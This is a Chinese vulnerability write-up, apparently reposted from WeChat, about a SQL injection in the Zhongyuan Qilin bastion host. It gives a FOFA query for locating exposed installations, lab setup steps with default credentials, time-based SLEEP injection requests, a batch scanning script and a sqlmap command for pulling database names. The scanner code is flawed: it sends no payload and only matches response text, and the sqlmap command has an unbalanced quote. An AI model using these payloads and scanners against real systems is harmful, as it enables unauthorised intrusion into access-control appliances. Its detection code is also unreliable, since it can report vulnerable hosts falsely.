> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wLwCqGByeLqxq98wy4IuXA)

申明：**本文仅供技术学习参考使用，请勿用作违法用途，否则后果自负。**

一、漏洞名称

中远麒麟堡垒机 SQL 注入漏洞

二、漏洞影响

中远麒麟堡垒机

系统登陆界面大概有这几种

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbD6kn36Mmd9uqia7Abpc94zPlLgSPd42r95EtjgnY8HOHmmLAJ1dlUawQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDfQUdHtkYKJvO0qrLl0sfKpIDpibX96FNFIicE8OTfh2QJ74AsR3Rkg2A/640?wx_fmt=png)

三、漏洞描述

中远麒麟堡垒机能够提供细粒度的访问控制，最大限度保护用户资源的安全。但麒麟堡垒机存在 SQL 注入漏洞。

四、资产 FOFA 搜索语句

```
body="url=\"admin.php?controller=admin_index&action=get_user_login_fristauth&username="

```

五、靶场搭建

下载，先从官网下载一个堡垒机安装包：http://www.tosec.com.cn/download.htm  

官方安装文档：https://doc.tosec.com.cn/install/tar_install/

官方有两种安装方式：tar 包安装和虚拟机安装，我是用 tar 包安装的  

解压

```
tar -zxvf centos7.tar.gz

```

运行两个脚本，安装软件

```
bash yum.sh
bash install.sh

```

安装完成后重启系统

```
reboot

```

查看

```
netstat -atunlp |grep 2288

```

浏览器访问：https://192.168.190.132

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDFOv3Q1VIa82laF1Lmagt5SC1MguBQW3ZG7qkqXp4DhlKW3JLRw4GXg/640?wx_fmt=png)

注意：浏览器访问时会提示不安全，点击左下方的 “高级” 继续访问。

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDfQUdHtkYKJvO0qrLl0sfKpIDpibX96FNFIicE8OTfh2QJ74AsR3Rkg2A/640?wx_fmt=png)

默认用户名：admin

默认密码：12345678

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDnUzX7nFo4icGozsic2Zo78ksxdXdp22lRmHjzdeiabAGNkCTbX3icjo8gQ/640?wx_fmt=png)

ssh 连接，端口 2288，root 密码还是你系统的密码。

六、漏洞复现  

向目标发送如下请求数据包，使响应延迟 5 秒  

```
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 78
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDT1libag1yHxbJiaJymAj7u1pTibyvVz8TZiae3moJ6VDic3P7qIEPV6TWqA/640?wx_fmt=png)

向目标发送如下请求数据包，使响应延迟 15 秒

```
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 79
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(15)))ptGN) AND 'AAdm'='AAdm

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDVrr7Zia8zJfJ2ZvWHIs7Fv0dtro8TP53sicNiawTJNUHSHZKqWCicFuw4Q/640?wx_fmt=png)

正常系统是在毫秒级响应，加上 SLEEP(5) 和 SLEEP(15) 之后响应时间分别为 5.064 秒和 15.134 秒证明存在 **sql 注入漏洞**

七、漏洞验证 poc

该 python 脚本可以批量检测漏洞，C:\Users\DELL\Desktop\1.txt 为输入目标文件，每行是一个 url

```
import argparse
import time
import requests
def get_url(file):
    with open('{}'.format(file),'r',encoding='utf-8') as f:
        for i in f:
            i = i.replace('\n', '')
            send_req(i)
def write_result(content):
    f = open("result.txt", "a", encoding="UTF-8")
    f.write('{}\n'.format(content))
    f.close()
def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/admin.php?controller=admin_commonuser'
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url,headers=header,verify=False,timeout=3)
        if response.status_code == 200 and "result" in response.text and "username and password does not match!" in response.text:
            result = '{} 存在中远麒麟堡垒机SQL注入漏洞!\n'.format(url_check)
            print(result)
            write_result(result)
        time.sleep(1)
    except Exception as e:
        pass
if __name__ == '__main__':
    file = r"C:\Users\DELL\Desktop\1.txt"
    get_url(file)

```

在桌面新建文件 1.txt, 写入靶场地址，使用 jupyter 运行上述代码

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDMnDSzicMSUshsYl4cDIH0ib3CGIC2mgAfI49Qnn5lBr41TFSmG3Slt7w/640?wx_fmt=png)

八、漏洞利用

使用 Sqlmap 获取数据库名称，中间提示一路输入 Y 并回车即可

```
sqlmap -u "https://ip:port/admin.php?controller=admin_commonuser" --data "user --level=3 --dbs

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDFnnamfyyA6Xm5RburJn2ibjvFY6qZY0x91DNDSkIW5OvrWexWCULyxQ/640?wx_fmt=png)